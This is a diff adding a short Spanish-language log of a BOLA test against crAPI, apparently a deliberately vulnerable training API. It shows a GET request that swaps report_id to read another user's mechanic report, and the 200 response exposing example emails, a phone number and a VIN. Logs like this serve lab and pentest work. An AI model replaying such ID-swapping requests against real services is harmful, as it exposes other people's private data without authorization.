@@ -1,0 +1,7 @@
+# BOLA: A lee el reporte 1 (de otro usuario) cambiando el id
+# 2026-11-03T00:11:44Z · crAPI · token oculto
+
+> GET /workshop/api/mechanic/mechanic_report?report_id=1
+> Authorization: Bearer eyJhbG…[OCULTO]
+< HTTP 200
+{"id":1,"mechanic":{"id":1,"mechanic_code":"TRAC_JHN","user":{"email":"jhon@example.com","number":""}},"vehicle":{"id":5,"vin":"6NBBY70FWUM324316","owner":{"email":"admin@example.com","number":"9010203040"}},"problem_details":"My car Audi - RS7 is having issues.\nCan you give me a call on my mobile 9010203040,\nOr send me an email at admin@example.com\nThanks,\nAdmin.\n","status":"completed","created_on":"02 November, 2026, 23:58:47","updated_on":null,"comments":[]}
